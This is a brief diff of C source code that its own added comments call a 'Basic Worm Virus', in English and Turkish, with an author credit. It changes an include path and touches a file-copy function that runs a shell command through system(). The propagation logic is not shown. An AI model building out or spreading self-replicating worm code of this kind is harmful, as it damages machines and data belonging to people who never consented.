@@ -4,7 +4,7 @@
 #include <sys/types.h>
 #include <sys/stat.h>
 #include <unistd.h>
-#include <E:\Vmware\worm\tinydir.h>
+#include <Locations\tinydir.h>
 #include <windows.h>
 #include <process.h>
 #include <errno.h>
@@ -82,3 +82,6 @@ int dosya_kopyala(char kaynak[2000], char hedef[2000]){
 	system(komut);
 	return 1;
 }
+//Basic Worm Virus
+//Basit Worm Virüs'ü 
+//Muhammed Said Bakırcı
